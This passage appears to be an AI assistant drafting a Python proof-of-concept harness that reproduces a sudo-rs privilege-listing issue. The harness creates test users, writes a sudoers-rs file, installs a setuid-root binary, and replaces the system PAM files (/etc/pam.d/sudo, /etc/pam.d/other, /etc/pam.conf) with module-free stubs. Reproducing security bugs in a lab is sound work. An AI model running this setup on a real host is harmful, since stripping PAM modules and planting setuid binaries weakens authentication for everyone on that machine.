Let me draft it now:\n\n```python\n#!/usr/bin/env python3\n\"\"\"PoC driver for the sudo-rs multi-user privilege-listing scenario.\"\"\"\n\nimport argparse\nimport json\nimport os\nimport pwd\nimport grp\nimport shutil\nimport signal\nimport subprocess\nimport sys\nimport time\n\nSUDOERS_RS = \"/etc/sudoers-rs\"\nSUDOERS_RS_CONTENT = (\n    \"invoker ALL=(ALL:ALL) NOPASSWD: /bin/true\\n\"\n    \"victim ALL=(ALL:ALL) ALL\\n\"\n)\nPAM_FILES = [\"/etc/pam.d/sudo\", \"/etc/pam.d/other\", \"/etc/pam.conf\"]\nPAM_CONTENT = (\n    \"# PoC environment: comment-only PAM service.\\n\"\n    \"# Intentionally defines no modules so that the PAM bootstrap succeeds\\n\"\n    \"# without loading any shared PAM modules.\\n\"\n)\nINSTALL_DIR = \"/opt/sudors-poc\"\nINSTALL_PATH = os.path.join(INSTALL_DIR, \"sudo\")\n\nINVOKER = \"invoker\"\nVICTIM = \"victim\"\n\ndef ensure_user(name):\n    try:\n        pwd.getpwnam(name)\n        return\n    except KeyError:\n        pass\n    subprocess.run([\"useradd\", \"-m\", name], check=True)\n    pwd.getpwnam(name)  # raises if still missing\n\ndef write_root_file(path, content, mode):\n    # ensure parent\n    parent = os.path.dirname(path)\n    if parent:\n        os.makedirs(parent, exist_ok=True)\n    fd = os.open(path, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, mode)\n    try:\n        os.fchown(fd, 0, 0)\n        os.fchmod(fd, mode)\n        os.write(fd, content.encode())\n    finally:\n        os.close(fd)\n\ndef install_binary(binary):\n    os.makedirs(INSTALL_DIR, exist_ok=True)\n    os.chown(INSTALL_DIR, 0, 0)\n    os.chmod(INSTALL_DIR, 0o755)\n    if os.path.exists(INSTALL_PATH):\n        os.remove(INSTALL_PATH)  # in case of read-only? setuid file owned root; root can remove anyway\n    shutil.copyfile(binary, INSTALL_PATH)\n    os.chown(INSTALL_PATH, 0, 0)\n    os.chmod(INSTALL_PATH, 0o4755)\n    return INSTALL_PATH\n\ndef run_invocation(cmd, timeout):\n    start = time.monotonic()\n    timed_out = False\n    try:\n        proc = subprocess.run(\n            cmd,\n            stdout=subprocess.PIPE,\n            stderr=subprocess.PIPE,\n            timeout=timeout,\n            user=INVOKER,\n            encoding=\"utf-8\",\n            errors=\"replace\",\n            env={\"PATH\": \"/usr/sbin:/usr/bin:/sbin:/bin\", \"HOME\": pwd.getpwnam(INVOKER).pw_dir, \"LANG\": \"C.UTF-8\"},\n            cwd=\"/\",\n        )\n        rc = proc.returncode\n        out, err = proc.stdout or \"\", proc.stderr or \"\"\n    except subprocess.TimeoutExpired as e:\n        timed_out = True\n        rc = None\n        out = e.stdout or \"\"\n        err = e.stderr or \"\"\n        if isinstance(out, bytes): out = out.decode(\"utf-8\", \"replace\")\n        if isinstance(err, bytes): err = err.decode(\"utf-8\", \"replace\")\n    runtime_ms = int(round((time.monotonic() - start) * 1000))\n    sig = None\n    if rc is not None and rc < 0:\n        try:\n            sig = signal.Signals(-rc).name\n        except ValueError:\n            sig = \"SIG%d\" % -rc\n    return rc, sig, timed_out, runtime_ms, out, err\n```\n\nWait: env — should I scrub env? yes per contract.\n\nThen main:\n\n```python\ndef main():\n    ap = argparse.ArgumentParser()\n    ap.add_argument(\"--binary\", required=True)\n    ap.add_argument(\"--json-out\")\n    ap.add_argument(\"--timeout\", type=float, default=30.0)\n    args = ap.parse_args()\n\n    result = {\n        \"binary\": args.binary,\n        \"command\": [],\n        \"returncode\": None,\n        \"signal\": None,\n        \"timed_out\": False,\n        \"runtime_ms\": 0,\n        \"stdout\": \"\",\n        \"stderr\": \"\",\n        \"observable\": {\"kind\": \"output\", \"value\": \"\", \"path\": None},\n        \"error\": None,\n    }\n    try:\n        if os.geteuid() != 0:\n            raise RuntimeError(\"must run as root\")\n        if not os.path.isfile(args.binary):\n
